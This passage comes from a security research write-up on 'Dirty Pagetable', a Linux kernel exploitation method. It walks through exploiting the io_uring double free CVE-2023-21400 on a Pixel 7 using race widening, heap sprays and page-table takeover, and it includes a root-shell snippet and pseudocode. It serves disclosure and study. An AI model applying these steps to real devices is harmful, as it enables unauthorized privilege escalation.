> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [yanglingxi1993.github.io](https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html)

> by Nicolas Wu(@NVamous)

**_by Nicolas Wu([@NVamous](https://twitter.com/NVamous))_**

1. Introduction to Dirty Pagetable[](#1-introduction-to-dirty-pagetable "Permanent link")
------------------------------------------------------------------------------------------

Dirty Pagetable is a new novel kernel exploitation method. The idea of the exploitation method is to employ heap-based vulnerabilities to manipulate user page tables, which gives us a powerful primitive: read/write arbitrary physical addresses. We name the method Dirty Pagetable. Dirty Pagetable has many attractive advantages compared to the existing kernel exploitation methods. First, it is a data-only exploitation technique, so it can naturally bypass many powerful mitigation techniques like CFI, KASLR, SMAP/PAN, etc. This feature can also help us develop a universal exploit. Second, it’s a powerful exploitation method that can still be applied to the latest Linux kernel. As we know, Kernel Space Mirroring Attack(KSMA) is a powerful kernel exploitation method that has been widely used for years. However, it has been mitigated on newer Linux kernel. But Dirty Pagetable still works, achieving the same effect like a charm. Third, it can significantly improve the quality of exploitation of many heap-based vulnerabilities. We have noticed that many memory corruption vulnerabilities tend to be exploited by attacking the page cache of read-only binaries or libraries. This method requires much more work to get a complete privilege escalation on Android. But Dirty Pagetalbe can employ these heap-based vulnerabilities to attack kernel directly so that we can fulfill privilege escalation more conveniently.

We fulfilled privilege escalation on the latest Google Pixel 7, Google’s most secure and private phone yet. We finished the exploit with a 0-day vulnerability(CVE-2023-21400) we found recently, and we managed to bypass all the mitigation techniques deployed on Google Pixel 7. Moreover, we developed new exploits for two popular types of vulnerabilities: file UAF and pid UAF with Dirty Pagetable. Compared to those known exploits, Dirty Pagetable has pushed the exploitation of these vulnerabilities to the next level.

The layout of the article is like:

```
{
    1. Introduction to Dirty Pagetable

    2. An overview of how Dirty Pagetable works

    3. Exploit a double-free vulnerability(CVE-2023-21400) with Dirty Pagetable
        3.1 Root cause of CVE-2023-21400
        3.2 Trigger the issue
        3.3 Nice try for the issue
        3.4 Is the issue exploitable?
        3.5 Let's get root
        3.6 Reflections

    4. Exploit file UAF vulnerability with Dirty Pagetable
        4.1. File UAF: One of the most popular vulnerabilities in recent years
        4.2. Exploit the file UAF with Dirty Pagetable

    5. Exploit pid UAF vulnerability with Dirty Pagetable
        5.1 Brief introduction to CVE-2020-29661
        5.2 Exploit CVE-2020-29661 with Dirty Pagetable

    6. Challenges when exploiting with Dirty Pagetable
        6.1 How to flush TLB and page table caches
        6.2 How to prevent the unexpected actions on the page table during the privilege escalation

    7. Mitigation for Dirty Pagetable

    8. Acknowlegements

    9. References
}
```

2. An overview of how Dirty Pagetable works[](#2-an-overview-of-how-dirty-pagetable-works "Permanent link")
------------------------------------------------------------------------------------------------------------

Dirty Pagetable could be used to exploit heap-based vulnerabilities like heap uaf, double free, and OOB vulnerabilities, etc. For a more straightforward explanation, we will take a common uaf vulnerability as an example to briefly describe how to exploit heap-based vulnerabilities with Dirty Pagetalbe step by step:

##### Step 1. Trigger the UAF and get the victim slab reclaimed to the page allocator[](#step-1-trigger-the-uaf-and-get-the-victim-slab-reclaimed-to-the-page-allocator "Permanent link")

As we know, a uaf vulnerability would cause the release of a heap object which could be used later. We call this heap object the victim object. Because the Linux kernel uses the slab allocator to manage all kinds of heap objects, the victim object must belong to a heap slab which we call the victim slab, for a more straightforward explanation.

By triggering the uaf, we will get the victim object released. After that, if we continue to release all the other objects in the victim slab, the victim slab will become empty, and this could get the victim slab reclaimed to the page allocator(Many researchers have talked about how to let an empty slab be reclaimed by page allocator quickly and stably, so no more discussion here)

For now, we have reclaimed the victim slab to the page allocator.

##### Step 2. Occupy the victim slab with user page tables[](#step-2-occupy-the-victim-slab-with-user-page-tables "Permanent link")

Because user page tables are allocated from the page allocator directly, we can occupy the victim slab with user page tables by allocating many user page tables at once. Please note that we are using last-level page tables here.

Once we succeed in occupying the victim slab with user page tables, we could get such a scene:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets/pic1_occupy_with_pagetable.svg)

Figure 1

As you can see, the victim object is located in a user page table.

##### Step 3. Construct the primitive for manipulating the Page Table Entry(PTE)[](#step-3-construct-the-primitive-for-manipulating-the-page-table-entrypte "Permanent link")

After step 2, it’s obvious that if we can construct a write primitive with the victim object, we can modify the Page Table Entry(PTE) as we want.

Constructing a proper primitive with the victim object to modify the PTE is a challenge in Dirty Pagetable. We will discuss how to solve this challenge in the following sections: The section “Exploit a double-free vulnerability(CVE-2023-21400) with Dirty Pagetable” will present how we convert the double-free vulnerability to a write primitive for manipulating PTE. The section “Exploit file UAF vulnerability with Dirty Pagetable” and “Exploit pid UAF vulnerability with Dirty Pagetable” will present how we convert the use-after-free vulnerability to an increment primitive for manipulating PTE.

We can assume that we have obtained a write primitive to manipulate PTE in the user page table.

##### Step 4. Modify PTE to patch the kernel[](#step-4-modify-pte-to-patch-the-kernel "Permanent link")

After step 3, we get the ability to control a PTE. By setting the physical address of the PTE to the physical address of kernel text/data, we can patch the kernel as we want!

To fulfill the privilege escalation, we choose to patch a few syscalls, including setresuid(), setresgid(), etc., so we can call them from an unprivileged process. We might need to patch SELinux related variables to disable SELinux if it’s enabled.

##### Step5. Get root[](#step5-get-root "Permanent link")

Since setresuid(), and setresgid() have been patched, we can get root by calling the following code directly:

```
if (setresuid(0, 0, 0) < 0) {
    perror("setresuid");
} else {
    if (setresgid(0, 0, 0) < 0) {
        perror("setresgid");
    } else {
        printf("[+] Spawn a root shell\n");
        system("/system/bin/sh");
    }
}
```

These five steps show the briefest procedure of Dirty Pagetable. In the following sections, we will discuss how Dirty Pagetable works with specific vulnerabilities in detail.

3. Exploit a double-free vulnerability(CVE-2023-21400) with Dirty Pagetable[](#3-exploit-a-double-free-vulnerabilitycve-2023-21400-with-dirty-pagetable "Permanent link")
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

CVE-2023-21400 is a double free vulnerability in io_uring. It’s found by Ye Zhang([@VAR10CK](https://twitter.com/VAR10CK)) and me last year, affecting kernel 5.10. The exploitation for it is sort of tortuous, but glad we finally made it! Let’s see how we exploit CVE-2023-21400 with Dirty Pagetable on Google Pixel 7.

### 3.1 Root cause of CVE-2023-21400[](#31-root-cause-of-cve-2023-21400 "Permanent link")

In io_uring, when we submit a request with `IOSQE_IO_DRAIN` enabled, the request will not be started before previously submitted requests have been completed. As a result, the request will be deferred. The deferred request will be added to the `defer_list` of the `io_ring_ctx` as an `io_defer_entry` object:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic1_defer_list.svg)

Figure 2

The `io_defer_entry` representing the deferred request will be removed from the `defer_list` right after a previously submitted request has been completed. Because the `defer_list` can be accessed concurrently, it must be protected by the spinlock `completion_lock` when accessing. However, there is a case in which the `defer_list` is processed without holding the `completion_lock`. In the io_uring with `IORING_SETUP_IOPOLL` enabled, we can try to get event completions by calling the syscall `io_uring_enter` with `IORING_ENTER_GETEVENTS`, and this will trigger the routine:`io_uring_enter()->io_iopoll_check()->io_iopoll_getevents()->io_do_iopoll()->io_iopoll_complete()->io_commit_cqring()->__io_queue_deferred()`.

```
static void __io_queue_deferred(struct io_ring_ctx *ctx)
{
    do {
        struct io_defer_entry *de = list_first_entry(&ctx->defer_list,
                        struct io_defer_entry, list);
        if (req_need_defer(de->req, de->seq))
            break;
        list_del_init(&de->list);
        io_req_task_queue(de->req);
        kfree(de);
    } while (!list_empty(&ctx->defer_list));
}
```

In the __io_queue_deferred(), it will get the

`io_defer_entry`

objects from

`ctx->defer_list`

and the associated requests will be queued for task_work_run(). As you can see that the

`ctx->defer_list`

gets accessed without holding the

`ctx->completion_lock`

. This can cause issues in a race condition. Except from the __io_queue_deferred(), the function io_cancel_defer_files() can also process the

`ctx->defer_list`

:

```
static void io_cancel_defer_files(struct io_ring_ctx *ctx,
                  struct task_struct *task,
                  struct files_struct *files)
{
    struct io_defer_entry *de = NULL;
    LIST_HEAD(list);
    spin_lock_irq(&ctx->completion_lock);
    list_for_each_entry_reverse(de, &ctx->defer_list, list) {
        if (io_match_task(de->req, task, files)) {
            list_cut_position(&list, &ctx->defer_list, &de->list);
            break;
        }
    }
    spin_unlock_irq(&ctx->completion_lock);
    while (!list_empty(&list)) {
        de = list_first_entry(&list, struct io_defer_entry, list);
        list_del_init(&de->list);
        req_set_fail_links(de->req);
        io_put_req(de->req);
        io_req_complete(de->req, -ECANCELED);
        kfree(de);
    }
}
```

The function io_cancel_defer_files() can be triggered in two ways. The first way is through do_exit() and the calling routine is

`do_exit()->io_uring_files_cancel()->__io_uring_files_cancel()->io_uring_cancel_task_requests()->io_cancel_defer_files()`

. The second way is through execve() and the calling routine is

`execve()->do_execve()->do_execveat_common()->bprm_execve()->io_uring_task_cancel()->__io_uring_task_cancel()->__io_uring_files_cancel()->io_uring_cancel_task_requests()->io_cancel_defer_files()`

. Comparing with the first way, the second way doesn’t require us to exit current task, so it could be more controllable. We will use the second way to trigger io_cancel_defer_files(). Since we have got two routines that can process

`ctx->defer_list`

at the same time, we can construct such a race condition easily:

```
iopoll  Task                                                exec Task
(cpu A)                                                     (cpu B)

A1.create a `io_ring_ctx` with
IORING_SETUP_IOPOLL enabled by io_uring_setup();

A2.generate an `io_defer_entry` object,
it will be added to `ctx->defer_list`

A3.trigger the __io_queue_deferred();          <-------->   B1.trigger the io_cancel_defer_files();
```

The race condition is supposed to trigger memory corruption because both tasks are processing the same list concurrently. But it is not the truth. In general, io_cancel_defer_files() only processes the defer list of

`io_ring_ctx`

which was created by the current task. So the io_cancel_defer_files() in the exec task won’t process the same defer list in the iopoll task. However, there is an exception. If we submit a request with IOSQE_IO_DRAIN enabled to the

`io_ring_ctx`

of iopoll task in the exec task, we can manage to let io_cancel_defer_files() in the exec task process the defer list of the

`io_ring_ctx`

. So the new race condition becomes this:

```
iopoll Task                                            exec Task
(cpu A)                                                (cpu B)

A1.create a `io_ring_ctx` by io_uring_setup();

A2.generate an `io_defer_entry` object,
it will be added into `ctx->defer_list`
                                                       B1.submit a request with IOSQE_IO_DRAIN
                                                       enabled to the `io_ring_ctx`
                                                        (this will generate another `io_defer_entry`
                                                         object to be added into `ctx->defer_list`)


A3.trigger the __io_queue_deferred();   <-------->     B2.trigger the io_cancel_defer_files();
```

In this race condition, memory corruption can be triggered when the exec task and the iopoll task are processing the defer list at the same time.

### 3.2 Trigger the issue[](#32-trigger-the-issue "Permanent link")

Although the issue can be triggered in a race condition, there is no guarantee as to when the io_cancel_defer_files() and __io_queue_deferred() will be triggered. So we have to force the memory corruption to happen by repeating the operations in the exec task and the iopoll task like this:

```
iopoll Task                                            exec Task
(cpu A)                                                (cpu B)
while(1) { //<----- repeat                             while(1) { //<----- repeat
  A1.create a `io_ring_ctx` by io_uring_setup();

  A2.generate an `io_defer_entry` object,
  it will be added into `ctx->defer_list`
                                                         B1.submit a request with IOSQE_IO_DRAIN enabled
                                                         to the `io_ring_ctx`
                                                          (this will generate another `io_defer_entry`
                                                          object to be added into `ctx->defer_list`)


  A3.trigger the __io_queue_deferred();   <-------->     B2.trigger the io_cancel_defer_files();
}                                                      }
```

By performing such a strategy we can get two kinds of crashes. The first crash is due to an invalid list. We know that __io_queue_deferred() and io_cancel_defer_files() are racing each other. Both functions would traverse the

`ctx->defer_list`

and remove objects from it, so the

`ctx->defer_list`

can be invalid sometimes. Once the

`ctx->defer_list`

becomes invalid, the __list_del_entry_valid() would force the kernel panic to happen. Obviously, this kind of crash is not exploitable. The second crash is due to the double free. Let’s have a look at such a scenario:

```
iopoll Task                                          exec Task
(cpu A)                                              (cpu B)

static void __io_queue_deferred(struct io_ring_ctx *ctx)
{
    do {
        struct io_defer_entry *de = list_first_entry(&ctx->defer_list,
                        struct io_defer_entry, list);
        if (req_need_defer(de->req, de->seq))
            break;

                                        static void io_cancel_defer_files(struct io_ring_ctx *ctx,
                                                          struct task_struct *task,
                                                          struct files_struct *files)
                                        {
                                            struct io_defer_entry *de = NULL;
                                            LIST_HEAD(list);
                                            spin_lock_irq(&ctx->completion_lock);
                                            list_for_each_entry_reverse(de, &ctx->defer_list, list) {
                                                if (io_match_task(de->req, task, files)) {
                                                    list_cut_position(&list, &ctx->defer_list, &de->list);
                                                    break;
                                                }
                                            }
                                            spin_unlock_irq(&ctx->completion_lock);
                                            while (!list_empty(&list)) {
                                                de = list_first_entry(&list, struct io_defer_entry, list);
                                                list_del_init(&de->list);

        list_del_init(&de->list);
        io_req_task_queue(de->req);
        kfree(de);  //<-----  the first kfree()
    } while (!list_empty(&ctx->defer_list));
}

                                                req_set_fail_links(de->req);
                                                io_put_req(de->req);
                                                io_req_complete(de->req, -ECANCELED);
                                                kfree(de);  //<----- the second kfree()
                                            }
                                        }
```

Yes, double free happens here! maybe we can make use of this double free to do stuff!

### 3.3 Nice try for the issue[](#33-nice-try-for-the-issue "Permanent link")

After knowing this is a double free, we started to dive into it. The `io_defer_entry` object is allocated from kmalloc-128 kmem-cache in kernel 5.10 on Android. This kernel double free will be triggered step by step:  
step0. before the first kfree():

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic2_before_kfree.svg)

Figure 3

step1. after the first kfree():

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic3_first_kfree.svg)

Figure 4

step2. after the second kfree():

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic4_second_kfree.svg)

Figure 5

As you can see that the slab gets into an illegal state: both freelist and the “next object” points to the same free object. This is a really interesting state because we can allocate objects from this slab two times but only get the same object! Ideally, we can make use of this situation to control the freelist of the slab: The first step, we can manage to allocate a content controllable object from the slab. After this, the slab will become like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic5_after_allocate.svg)

Figure 6

As you can see, because the object is content controllable, we can make the “next object” point to any virtual address where we can totally control! The second step, we continue to allocate an object from the slab. After this, the slab will become like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic6_after_second_allocate.svg)

Figure 7

Yes, we just make the freelist point to the virtual address which we can totally control. From here we can easily get root. However, the Android kernel enables CONFIG_SLAB_FREELIST_HARDENED, which gets the “next object” pointer obfuscated and makes it impossible for us to finish the first step. As a result, kernel panic would happen because freelist is out of control and we will allocate an object from an illegal virtual address. Nice try, but it didn’t work out.

### 3.4 Is the issue exploitable?[](#34-is-the-issue-exploitable "Permanent link")

#### 3.4.1 The two challenges we are facing[](#341-the-two-challenges-we-are-facing "Permanent link")

Ever since we can’t exploit the issue after both kfree() are finished, we start to try to turn this issue into a UAF. The strategy is really simple:

```
iopoll  Task                                        exec Task
(cpu A)                                             (cpu B)

A1.kfree(de);

A2.perform heap spray: allocate victim objects to occupy the released de;

                                                    B1.kfree(de); // This will release the victim object

                                                    B2. use the victim object will trigger UAF
```

The strategy is easy to understand, but there are two challenges we are facing:

#### Challenge 1: A tiny time window between two kfree()[](#challenge-1-a-tiny-time-window-between-two-kfree "Permanent link")

The tiny time window will greatly affect the success rate of heap spray. It’s impossible for us to occupy the released `io_defer_entry` object before the second kfree() without additional operations.

#### Challenge 2: Triggering the double free by repeating makes the issue less exploitable[](#challenge-2-triggering-the-double-free-by-repeating-makes-the-issue-less-exploitable "Permanent link")

As mentioned, we have to trigger io_cancel_defer_files() and __io_queue_deferred() repeatedly to make double free happen. The double free surely happens in a few seconds if we perform the repeating. However, this trigger strategy heavily depends on the repeating rate. The faster the repeating is, the faster the bug will be triggered. During the test, we try to widen the time window between two kfree() by adding some debug code to solve challenge 1:

```
iopoll  Task                                        exec Task
(cpu A)                                             (cpu B)

A1.kfree(de);

A2.perform heap spray: allocate victim objects to occupy the released de;

                                                    B1.mdelay(200) // widen the time window !!!

                                                    B2.kfree(de); // This will release the victim object

                                                    B3. use the victim object will trigger UAF
```

It’s obvious that the time window is big enough for the heap spray and the first challenge seems solved. But in practice, we found that the issue cannot be triggered anymore with such a big time window. The reason for this result is that although the huge time window allows enough time for the heap spray, it also makes the repeating very slow, so it becomes very difficult to trigger the issue.

For now, we seem to be in a very awkward situation: on the one hand, we want the time window to be larger to solve challenge 1, and on the other hand, we want the repeating to be faster to solve challenge 2. We can never solve the two challenges at the same time if we don’t come up with a new method to trigger the issue more efficiently. At this stage, we are starting to be a little unsure if this vulnerability is actually exploitable. But it is still too early to draw conclusions because we still have a lot of code details that have not been covered.

#### 3.4.2 The double free is exploitable![](#342-the-double-free-is-exploitable "Permanent link")

After reading the code for a long time, we found some neglected key information to solve these two challenges very well.

#### Solve challenge 2:[](#solve-challenge-2 "Permanent link")

First of all, we found that `ctx->defer_list` can be a really long list because io_uring doesn’t limit the number of `io_defer_entry` objects in the `ctx->defer_list`. Secondly, generating an `io_defer_entry` object is much easier than we thought before. According to the document of io_uring, we can not only generate an `io_defer_entry` object associated with a request of which REQ_F_IO_DRAIN is enabled, but also generate an `io_defer_entry` object associated with a request of which REQ_F_IO_DRAIN is not enabled.

```
IOSQE_IO_DRAIN
              When this flag is  specified,  the  SQE  will  not  be  started  before  previously
              submitted  SQEs  have  completed,  and new SQEs will not be started before this one
              completes. Available since 5.2.
```

Here is the pseudocode used to generate a million

`io_defer_entry`

objects, each of them is associated with a request of which REQ_F_IO_DRAIN is not enabled:

```
iopoll  Task
(cpu A)

A1. create a `io_ring_ctx` with IORING_SETUP_IOPOLL enabled by io_uring_setup();

A2: commit an IORING_OP_READ request to read a file of ext4 filesystem ;

A3. commit a request with REQ_F_IO_DRAIN enabled; // This will trigger the generating of a
                                                  // `io_defer_entry` object because the CQE of the
                                                  // previous request is not acquired yet

A4. for (i = 0; i < 1000000; i++) {
        commit a request with REQ_F_IO_DRAIN disabled;  // This will trigger the generating of a
    }                                                   // `io_defer_entry` object associated with
                                                        // a request of which REQ_F_IO_DRAIN
                                                        // is not enabled !
```

Ever since we have the ability to generate so many

`io_defer_entry`

objects associated with requests of which REQ_F_IO_DRAIN is not enabled, we can let the __io_queue_deferred() execute for a very long time when it’s traversing the

`ctx->defer_list`

:

```
static void __io_queue_deferred(struct io_ring_ctx *ctx)
{
    do {
        struct io_defer_entry *de = list_first_entry(&ctx->defer_list,
                        struct io_defer_entry, list);
        if (req_need_defer(de->req, de->seq)) // return false because the REQ_F_IO_DRAIN is not enabled
            break;
        list_del_init(&de->list);
        io_req_task_queue(de->req);
        kfree(de);
    } while (!list_empty(&ctx->defer_list));
}
```

In practice, we can let __io_queue_deferred() execute for a few seconds by increasing the number of objects. A few seconds is a really large time window! For now, we can be really positive about when the __io_queue_deferred() is executing. So we just need to trigger the io_cancel_defer_files() during the execution of __io_queue_deferred(), and the double free will be triggered with high probability. No more repeating strategy!

#### Solve challenge 1:[](#solve-challenge-1 "Permanent link")

Since we don’t have to trigger the double free with the repeating strategy, we can try to widen the time window between the kfree() as long as we want. First of all, we have tried to use a few known methods to widen the time window, such as the method given by Jann Horn[1], the method given by Yoochan Lee, Byoungyoung Lee, Chanwoo Min[2]. But all the methods didn’t work out directly. It seems that the second kfree() has already been accomplished in the exec task before we try to perform the known methods by calling syscalls. Although the known methods didn’t work out directly, they remind me that maybe there is some code in io_cancel_defer_files() that can help us expand the time window naturally ?

So I started to dive into the io_cancel_defer_files(), it turns out there are so many wakeup operations before the second kfree() in io_cancel_defer_files(). Before calling the kfree(), the io_cancel_defer_files() would call io_req_complete(), which would trigger the io_cqring_ev_posted():

```
static void io_cqring_ev_posted(struct io_ring_ctx *ctx)
{
    if (wq_has_sleeper(&ctx->cq_wait)) {
        wake_up_interruptible(&ctx->cq_wait);  //<------------------------ wakeup the waiter (1)
        kill_fasync(&ctx->cq_fasync, SIGIO, POLL_IN);
    }
    if (waitqueue_active(&ctx->wait))
        wake_up(&ctx->wait);                   //<------------------------ wakeup the waiter (2)
    if (ctx->sq_data && waitqueue_active(&ctx->sq_data->wait))
        wake_up(&ctx->sq_data->wait);          //<------------------------ wakeup the waiter (3)
    if (io_should_trigger_evfd(ctx))
        eventfd_signal(ctx->cq_ev_fd, 1);      //<------------------------ wakeup the waiter (4)
}
```

There are 4 places where the exec task would wake up other tasks for running. We make use of the first one for widening the time window. We only need to set up a waiter into

`ctx->cq_wait`

by epoll_wait() on the io_uring fd. We need another epoll task to perform the epoll_wait(), and the epoll task can preempt the CPU when the wake_up_interruptible() gets called and put a stop to io_cancel_defer_files() before the second kfree(). However, the time window is still likely to be very small if exec task is put back into execution very quickly. To solve this problem once and for all, we reuse the scheduler strategy mentioned by Jann Horn[1] and we succeed in expanding the time window between the kfree() for seconds or even longer. For now, we have solved challenge 1 very well. The new method to trigger the double free and turn it to UAF is like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic7_final_race.svg)

Figure 8

In practice, this new method can trigger the UAF to the victim object in a big chance. Now, we can be 100% sure that this vulnerability is exploitable!

### 3.5 Let’s get root[](#35-lets-get-root "Permanent link")

#### 3.5.1 Create the victim `signalfd_ctx` object[](#351-create-the-victim-signalfd_ctx-object "Permanent link")

We choose the `signalfd_ctx` object as the victim object for the heap spray between the kfree(). The `signalfd_ctx` object is allocated from kmalloc-128 kmem-cache through signalfd():

```
static int do_signalfd4(int ufd, sigset_t *mask, int flags)
{
    struct signalfd_ctx *ctx;
    ......
    sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));// bit18 and bit8 of mask will be set to 1
    signotset(mask);

    if (ufd == -1) {
        ctx = kmalloc(sizeof(*ctx), GFP_KERNEL);      //<-----------  allocation of signalfd_ctx
        if (!ctx)
            return -ENOMEM;

        ctx->sigmask = *mask;

        /*
         * When we call this, the initialization must be complete, since
         * anon_inode_getfd() will install the fd.
         */
        ufd = anon_inode_getfd("[signalfd]", &signalfd_fops, ctx,
                       O_RDWR | (flags & (O_CLOEXEC | O_NONBLOCK)));
        if (ufd < 0)
            kfree(ctx);
    } else {
        struct fd f = fdget(ufd);
        if (!f.file)
            return -EBADF;
        ctx = f.file->private_data;
        if (f.file->f_op != &signalfd_fops) {
            fdput(f);
            return -EINVAL;
        }
        spin_lock_irq(¤t->sighand->siglock);
        ctx->sigmask = *mask;                       // <----  limited write operation to signalfd_ctx 
        spin_unlock_irq(¤t->sighand->siglock);

        wake_up(¤t->sighand->signalfd_wqh);
        fdput(f);
    }

    return ufd;
}
```

As you can see, we can use the

`signalfd_ctx`

as the victim object and write into the first 8 bytes of the

`signalfd_ctx`

after the heap spray. Although the writing operation is limited, the limitation won’t bother us that much. Except for the writing operation, we can also read the first 8 bytes of the

`signalfd_ctx`

through the

`show_fdinfo`

interface exported by procfs:

```
static void signalfd_show_fdinfo(struct seq_file *m, struct file *f)
{
    struct signalfd_ctx *ctx = f->private_data;
    sigset_t sigmask;

    sigmask = ctx->sigmask;
    signotset(&sigmask);
    render_sigset_t(m, "sigmask:\t", &sigmask);
}
```

Between the two kfree(), we can allocate 16000

`signalfd_ctx`

objects to occupy the released

`io_defer_entry`

object. And if we succeed in occupying the released

`io_defer_entry`

object, we will get a released

`signalfd_ctx`

object after the second kfree(). We call this released

`signalfd_ctx`

object as victim

`signalfd_ctx`

object.

#### 3.5.2 Locate the victim `signalfd_ctx` object[](#352-locate-the-victim-signalfd_ctx-object "Permanent link")

Although we have a victim `signalfd_ctx` object, we don’t know which fd is associated with it. So we have to perform spray again to catch the released victim `signalfd_ctx` object. And this time, we use the `seq_operations` object to perform the heap spray. The `seq_operations` object is allocated from kmalloc-128 kmem-cache, and the allocation can be triggered by single_open(). We can trigger single_open() by opening `/proc/self/status` or other procfs files.

```
int single_open(struct file *file, int (*show)(struct seq_file *, void *),
        void *data)
{
    struct seq_operations *op = kmalloc(sizeof(*op), GFP_KERNEL_ACCOUNT);//allocate seq_operations object
    int res = -ENOMEM;

    if (op) {
        op->start = single_start;
        op->next = single_next;
        op->stop = single_stop;
        op->show = show;
        res = seq_open(file, op);
        if (!res)
            ((struct seq_file *)file->private_data)->private = data;
        else
            kfree(op);
    }
    return res;
}
```

We can allocate 16000

`seq_operations`

objects to catch the released

`signalfd_ctx`

object. Once the released

`signalfd_ctx`

object gets occupied by a

`seq_operations`

object, it would be like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic8_locate_signalfd_ctx.svg)

Figure 9

Because the first 8 bytes of the `seq_operations` object is a kernel virtual address, we can locate the victim signal fd by reading the fdinfo of all the signal fd. If the fdinfo of a signal fd is not the same as initialized, it must be the victim signal fd. Since the victim signal fd is associated with the victim `signalfd_ctx` object, we successfully locate the victim `signalfd_ctx` object!

#### 3.5.3 Reclaim the slab in which the victim `signalfd_ctx` object lies[](#353-reclaim-the-slab-in-which-the-victim-signalfd_ctx-object-lies "Permanent link")

For now, if we close all the signal fd and `/proc/self/status` fd except the victim signal fd, we will make the slab where the victim `signalfd_ctx` object lies become empty. We call this empty slab the victim slab. With the help of the well-known cross-cache attack technique, it would be simple for us to let the page allocator reclaim the victim slab. Many researchers have talked about how to let an empty slab be reclaimed by the page allocator quickly and stably, so there is no more discussion here.

#### 3.5.4 Occupy the victim slab with user page tables and locate the victim `signalfd_ctx` object[](#354-occupy-the-victim-slab-with-user-page-tables-and-locate-the-victim-signalfd_ctx-object "Permanent link")

Once the victim slab is reclaimed to the page allocator, we can perform heap spray with user page tables to try to catch the victim slab. The size of the slab of kmalloc-128 kmem-cache is 1 page which is the same as the user page table, and both the victim slab and page table are allocated from the same zone of the page allocator, so there is a high probability that the user page table can occupy the victim slab. If the occupation succeeds, it will be like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic9_pagetable_occupy.svg)

Figure 10

As you can see, by writing the first 8 bytes of the victim `signalfd_ctx` object, we can control one PTE of the user page table! Since we can control a PTE, we can modify kernel text or data as we want by setting the physical address of the PTE to the physical address of kernel text or data.

Well, many details still need to be taken good care of. Let’s have a look at how to perform heap spray with user page tables step by step:

##### Step 1. create a large memory region in the virtual address space by mmap()[](#step-1-create-a-large-memory-region-in-the-virtual-address-space-by-mmap "Permanent link")

Because every last-level page table describes 2MiB of virtual memory, if we want to spray 512 user page tables, we must create a 512*2Mib-sized memory region with mmap(). The size of the memory region can be calculated with this formula:

```
size_of_memory_region = number_of_pagetable * 2MiB
```

Except for the size of the memory region, the start virtual address also needs to be taken good care of. The start virtual address we choose should be aligned with 2MiB(0x200000). The reason for this is that now we can only control the first 8 bytes of the victim

`signalfd_ctx`

object, and we also don’t know the exact location of the victim

`signalfd_ctx`

object in the victim slab, so it could be at any offset aligned by 128 in the slab. The 0x200000-aligned start virtual address would ensure that the PTE corresponding to the start virtual address is located at the first 8 bytes of the page table. With this guarantee, we will make sure the page table will be like this after Step 3:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic10_start_virtual_address.svg)

Figure 11

##### Step 2. Trigger the allocation of page tables[](#step-2-trigger-the-allocation-of-page-tables "Permanent link")

We have already created the memory region. To trigger the allocation of page tables, We need to perform a write operation every 0x200000 bytes from the start virtual address to ensure that all the user page tables in the memory region are allocated. Here is the pseudocode:

```
unsigned char *addr = (unsigned char *)start_virtual_address;
for (unsigned int i = 0; i < size_of_memory_region; i+= 0x200000) {
    *(addr + i) = 0xaa;
}
```

After this operation, the heap spray with user page tables has finished.

##### Step 3. Locate the victim `signalfd_ctx` object in page tables[](#step-3-locate-the-victim-signalfd_ctx-object-in-page-tables "Permanent link")

After Step 2, we only ensure that every page table’s first PTE is valid. Because the victim `signalfd_ctx` object can be located at any offset aligned with 128 in the page table, we have to validate all the PTEs located at the offset aligned with 128 in the page table. To finish that, we must perform a write operation every 16K bytes from the start virtual address. After this operation, we will see the page table shown in Figure 11. By reading the fdinfo of the victim signal fd, we can leak the first 8 bytes of the victim `signalfd_ctx` object. If we have succeeded in occupying the victim slab with a user page table, we will see a valid PTE value by reading the fdinfo of the victim signal fd. Otherwise, we failed. If that happens, we can unmap() the memory region and repeat Step 1 ~ Step 3 with a bigger memory region until it succeeds.

#### 3.5.5 Patch the kernel to finish the root![](#355-patch-the-kernel-to-finish-the-root "Permanent link")

Since we located the victim `signalfd_ctx` object in page tables, we can totally control a PTE. By setting the physical address of the PTE to the physical address of kernel text and data, we can patch the kernel and get the root directly. Let’s accomplish this goal step by step:

##### Step1. Locate the user virtual address corresponding to the PTE[](#step1-locate-the-user-virtual-address-corresponding-to-the-pte "Permanent link")

Although we already control a PTE of the user page table, we don't know which user virtual address corresponds to this PTE. We can only patch the kernel code/data if we know the virtual address. The idea is like this:

![](https://yanglingxi1993.github.io/dirty_pagetable/assets2/pic11_find_virtual_address.svg)

Figure 12

To locate the user virtual address corresponding to the PTE, we need to modify the physical address of the PTE to a kernel physical address. And then traverse all the virtual addresses we have mapped to see if there is a virtual address of which the value is not the original value(0xaa) set before. If we find such a virtual address, then this virtual address is the one corresponding to the PTE.

##### Step2. Bypass the limitation of writing operation[](#step2-bypass-the-limitation-of-writing-operation "Permanent link")

Because the writing operation to the victim `signalfd_ctx` object is limited(the bit18 and bit8 of the written content will always be set to 1), we cannot patch all the kernel address space unless we bypass it first. A normal PTE corresponding to a read+write user virtual address is like 0xe800098952ff43, and we can see that the bit8 of PTE is always set to 1, so we don't need to worry about bit8. But the bit18 is located in the physical address of the PTE, which means that if we don't bypass the limitation, we can only patch the kernel where the bit18 of the physical address is 1.  
The limitation is caused by the `sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP));` sentence in the do_signalfd4(). We wonder if we can patch the sentence to remove the limitation.

```
static int do_signalfd4(int ufd, sigset_t *mask, int flags)
{
    struct signalfd_ctx *ctx;
    ......
    sigdelsetmask(mask, sigmask(SIGKILL) | sigmask(SIGSTOP)); //bit18 and bit8 of mask will be set to 1
    signotset(mask);

    if (ufd == -1) {
        ......
    } else {
        struct fd f = fdget(ufd);
        if (!f.file)
            return -EBADF;
        ctx = f.file->private_data;
        if (f.file->f_op != &signalfd_fops) {
            fdput(f);
            return -EINVAL;
        }
